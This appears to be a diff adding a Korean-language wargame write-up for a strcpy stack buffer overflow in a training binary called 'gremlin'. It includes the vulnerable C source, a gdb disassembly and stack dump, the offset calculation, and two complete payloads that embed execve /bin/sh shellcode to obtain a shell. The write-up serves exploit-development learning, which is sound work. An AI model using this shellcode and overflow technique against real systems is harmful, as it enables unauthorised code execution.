@@ -1,0 +1,127 @@
+1. gate 레벨
+
+
+중요 !! bash2 에서 진행해야 문제를 해결할수있다 !!
+
+
+일단 알아낸 정보
+
+
+strcpy 를 이용한 버퍼 오버플로우 문제
+
+
+답은
+
+
+내예상으로
+
+buf 부터 ret 까지의 거리 + ret주소
+
+따라서 버퍼 256 + sfp(4) = 260 에 ret주소 4바이트
+
+256    +   4  =  260
+
+
+
+
+int main(int argc, char *argv[])
+{
+    char buffer[256];
+    if(argc < 2){
+        printf("argv error\n");
+        exit(0);
+    }
+    strcpy(buffer, argv[1]);
+    printf("%s\n", buffer);
+}
+
+
+이므로 
+
+구할수있는 방법이 2가지가 있는데 첫번쨰로 환경변수를 이용해서 구해보자
+
+export code=$(python -c 'print"\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
+
+입력해서 환경변수를 등록해준다음 vi로 .c 파일을 만들어 주소값을 획득한다.
+
+그리고 아까 버퍼거리 구한 260과 주소를 합쳐서 공격하면 된다.
+
+따라서
+./gremlin `python -c 'print"\x90"*260+"\xb1\xfe\xff\xbf"'`
+
+해주면 bash 쉘 권한을 획득한다.
+
+
+
+
+두번쨰는 파일을 복사해서 직접 대입하는 방식인데.
+
+나는 aaa로 gremlin을 복사했다.
+
+그리고 gdb -q aaa 를 통해서 직접 디어셈블을 하면서 분석하고.
+
+[gate@localhost gate]$ gdb -q aaa
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048430 <main>:       push   %ebp
+0x8048431 <main+1>:     mov    %ebp,%esp
+0x8048433 <main+3>:     sub    %esp,0x100
+0x8048439 <main+9>:     cmp    DWORD PTR [%ebp+8],1
+0x804843d <main+13>:    jg     0x8048456 <main+38>
+0x804843f <main+15>:    push   0x80484e0
+0x8048444 <main+20>:    call   0x8048350 <printf>
+0x8048449 <main+25>:    add    %esp,4
+0x804844c <main+28>:    push   0
+0x804844e <main+30>:    call   0x8048360 <exit>
+0x8048453 <main+35>:    add    %esp,4
+0x8048456 <main+38>:    mov    %eax,DWORD PTR [%ebp+12]
+0x8048459 <main+41>:    add    %eax,4
+0x804845c <main+44>:    mov    %edx,DWORD PTR [%eax]
+0x804845e <main+46>:    push   %edx
+0x804845f <main+47>:    lea    %eax,[%ebp-256]
+0x8048465 <main+53>:    push   %eax
+0x8048466 <main+54>:    call   0x8048370 <strcpy>
+0x804846b <main+59>:    add    %esp,8
+0x804846e <main+62>:    lea    %eax,[%ebp-256]
+0x8048474 <main+68>:    push   %eax
+0x8048475 <main+69>:    push   0x80484ec
+
+
+main+47 부터 256 버퍼를 받으므로 여기부터 한번 조사해보자.
+
+
+b *main+47 로 브레이크 포인트를 만들어주고
+
+r `python -c 'print"A"*256'` 으로 넣어준다.
+
+그리고 x/1000x $esp 로 반복되는 부분을 찾아준다.
+
+
+0xbffffb34:     0x00000000      0x00000000      0x00000000      0x69000000
+0xbffffb44:     0x00363836      0x6d6f682f      0x61672f65      0x612f6574
+0xbffffb54:     0x41006161      0x41414141      0x41414141      0x41414141
+0xbffffb64:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb74:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb84:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb94:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffba4:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffbb4:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffbc4:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffbd4:     0x41414141      0x41414141      0x41414141      0x41414141
+
+
+가 나오는데 약 0xbffffb54 쯤 부터 시작하므로 적당히 중간주소 0xbffffb84를 잡아서 사용해보자.
+
+이제 ret 주소 4바이트를 제외한 260바이트를 맞춰서 페이로드를 작성해보자.
+
+나는 쉘코드 25바이트를 넣을것이기떄문에
+
+200 + 25바이트 쉘코드 + 35 + ret 주소 형식으로 페이로드를 작성해보자.
+
+./gremlin `python -c 'print "A"*200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"A"*35+"\x84\xfb\xff\xbf"'`
+
+입력하면 bash 쉘을 획득할수있다.
+
+(중요 bash2 에서 진행해야한다)
+
